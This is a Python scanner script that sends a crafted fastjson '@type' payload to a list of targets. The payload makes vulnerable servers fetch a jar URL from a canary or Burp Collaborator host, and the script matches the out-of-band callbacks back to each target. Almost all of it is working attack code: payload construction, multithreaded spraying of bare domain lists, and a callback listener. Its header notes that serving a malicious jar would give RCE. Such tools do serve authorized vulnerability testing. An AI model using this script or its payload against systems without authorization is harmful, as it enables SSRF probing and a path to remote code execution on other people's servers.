#!/usr/bin/env python3
"""
fjscan_probe.py — ACTIVE, SAFE detector for the fastjson @JSONType SSRF/RCE path.

Sends the crafted @type at a canary you control and correlates the out-of-band
callback back to the target => proof the vulnerable code path is reachable.
SAFE: the canary serves nothing (404), so no attacker class is ever loaded — you
observe SSRF only, never RCE. (On JDK 8 a *malicious* jar would yield RCE; this
tool never serves one.)

Two modes:
  built-in canary (self-contained):
     fjscan_probe.py --canary-ip <ip-reachable-by-targets> --listen-port 19000 \
                     --targets targets.txt
  external collaborator (Burp / interactsh):
     fjscan_probe.py --collaborator <ip|int|host|collab-subdomain> [--port 80] \
                     --targets targets.txt
     (no local listener; watch Burp for HTTP GET /<token>; a token->target map is printed)

targets.txt: one per line, "[METHOD ]URL" (default POST). Body defaults to the
probe object; use --wrap to nest it, e.g. --wrap '{"name":{{P}}}'.

SINK CONSTRAINT: '.' in @type becomes '/', so the callback host must be dot-free.
IPv4/Collaborator subdomains are auto-encoded to a decimal integer; correlation is
by the unique URL PATH token (Burp shows it). See fjpayload.py header for detail.
Authorized use only.
"""
import argparse, concurrent.futures, http.server, ipaddress, os, socket, sys, threading, time, urllib.request

HITS = {}   # token -> list of (client_ip, request_line)
LOCK = threading.Lock()


def encode_host(collab):
    if collab.isdigit():
        return collab, "integer host"
    try:
        return str(int(ipaddress.IPv4Address(collab))), f"IPv4 {collab} -> int"
    except ipaddress.AddressValueError:
        pass
    if '.' not in collab:
        return collab, "dot-free host"
    try:
        ip = socket.gethostbyname(collab)
        return str(int(ipaddress.IPv4Address(ip))), (f"{collab} -> {ip} -> int (correlate by path token; "
                                                     "DNS-subdomain correlation won't fire through this sink)")
    except OSError as e:
        sys.exit(f"[!] cannot resolve {collab}: {e}")


def make_type(host, port, token, entry="POC"):
    return f"jar:http:..{host}:{port}.{token}!.{entry}"


class CanaryHandler(http.server.BaseHTTPRequestHandler):
    def _record(self):
        token = self.path.lstrip('/').split('!')[0].split('/')[0]
        with LOCK:
            HITS.setdefault(token, []).append((self.client_address[0], f"{self.command} {self.path}"))
        self.send_response(404); self.send_header("Content-Length", "0"); self.end_headers()
    do_GET = _record
    do_POST = _record
    def log_message(self, *a): pass


def start_canary(port):
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), CanaryHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


HTTP_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"}


def build_url(host_or_url, scheme, port, path):
    """Accept a full URL OR a bare domain/host[:port][/path] and return a full URL."""
    if "://" in host_or_url:
        return host_or_url
    hostpart = host_or_url.strip("/")
    tail = ""
    if "/" in hostpart:                      # host already carries a path
        hostpart, tail = hostpart.split("/", 1)
        tail = "/" + tail
    if port and ":" not in hostpart:
        hostpart = f"{hostpart}:{port}"
    if not tail:
        tail = path if path.startswith("/") else "/" + path
    return f"{scheme}://{hostpart}{tail}"


def load_targets(path, scheme, port, path_suffix, default_method):
    """One target per line: '[METHOD ]<full-url|bare-domain>'. '-' reads stdin.
    Bare domains are expanded with --scheme/--port/--path so you can feed a plain
    domain list."""
    out = []
    fh = sys.stdin if path == "-" else open(path)
    try:
        for line in fh:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split(None, 1)
            if len(parts) == 2 and parts[0].upper() in HTTP_METHODS:
                method, tgt = parts[0].upper(), parts[1]
            else:
                method, tgt = default_method, line
            out.append((method, build_url(tgt, scheme, port, path_suffix)))
    finally:
        if fh is not sys.stdin:
            fh.close()
    return out


def send(method, url, body, content_type, timeout):
    req = urllib.request.Request(url, data=body.encode(), method=method,
                                 headers={"Content-Type": content_type})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return f"HTTP {r.status}"
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}"
    except Exception as e:
        return f"send-error: {e.__class__.__name__}"


def main(argv):
    ap = argparse.ArgumentParser()
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--canary-ip", help="IP of THIS host as reachable by targets (built-in listener mode)")
    g.add_argument("--collaborator", help="external OOB: IPv4 | int | dot-free host | Collaborator subdomain")
    ap.add_argument("--listen-port", type=int, default=19000, help="built-in canary port")
    ap.add_argument("--port", type=int, default=80, help="collaborator port (external mode)")
    ap.add_argument("--targets", required=True,
                    help="file with one target per line ('-' = stdin). Full URLs OR bare "
                         "domains (expanded with --scheme/--port/--path). '# ' comments allowed.")
    ap.add_argument("--scheme", default="http", help="scheme for bare-domain targets (default http)")
    ap.add_argument("--target-port", type=int, default=None, help="port for bare-domain targets")
    ap.add_argument("--path", default="/parse", help="path for bare-domain targets (default /parse)")
    ap.add_argument("--method", default="POST", help="default HTTP method (default POST)")
    ap.add_argument("--threads", type=int, default=20, help="concurrent request workers (default 20)")
    ap.add_argument("--content-type", default="application/json")
    ap.add_argument("--wrap", default="{{P}}", help="body template; {{P}} = the probe object")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--wait", type=float, default=10.0, help="seconds to wait for callbacks (built-in mode)")
    args = ap.parse_args(argv)

    if args.canary_ip:
        host, note = encode_host(args.canary_ip)
        port = args.listen_port
        srv = start_canary(args.listen_port)
        print(f"[canary] listening on 0.0.0.0:{args.listen_port}  ({note})")
    else:
        host, note = encode_host(args.collaborator)
        port = args.port
        srv = None
        print(f"[collaborator] {note}  -> payload host={host}:{port} (watch Burp/interactsh)")

    targets = load_targets(args.targets, args.scheme, args.target_port, args.path, args.method)
    token_map = {}
    jobs = []
    for i, (method, url) in enumerate(targets):
        token = "fj%04x%s" % (i & 0xffff, os.urandom(3).hex())
        obj = '{"@type":"%s","x":1}' % make_type(host, port, token)
        body = args.wrap.replace("{{P}}", obj)
        token_map[token] = (method, url)
        jobs.append((token, method, url, body))

    workers = max(1, min(args.threads, len(jobs) or 1))
    print(f"[*] firing {len(jobs)} target(s) with {workers} thread(s)\n")
    plock = threading.Lock()

    def fire(job):
        token, method, url, body = job
        status = send(method, url, body, args.content_type, args.timeout)
        with plock:
            print(f"    [{token}] {method} {url}  -> {status}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        list(pool.map(fire, jobs))

    if srv:
        print(f"\n[*] waiting {args.wait}s for callbacks ...")
        time.sleep(args.wait)
        srv.shutdown()
        print("\n===== RESULT =====")
        vuln = 0
        for token, (method, url) in token_map.items():
            with LOCK:
                hits = HITS.get(token)
            if hits:
                vuln += 1
                print(f"  VULNERABLE  {url}")
                for cip, rl in hits:
                    print(f"              callback from {cip}: {rl}")
            else:
                print(f"  no-callback {url}")
        print(f"\nVULNERABLE={vuln}/{len(token_map)}  "
              f"(callback = fastjson fetched the jar: URL = @JSONType SSRF path reachable)")
        return 2 if vuln else 0
    else:
        print("\n[*] external mode: correlate these tokens in Burp Collaborator / interactsh:")
        for token, (method, url) in token_map.items():
            print(f"    GET /{token}   <=  {method} {url}")
        return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
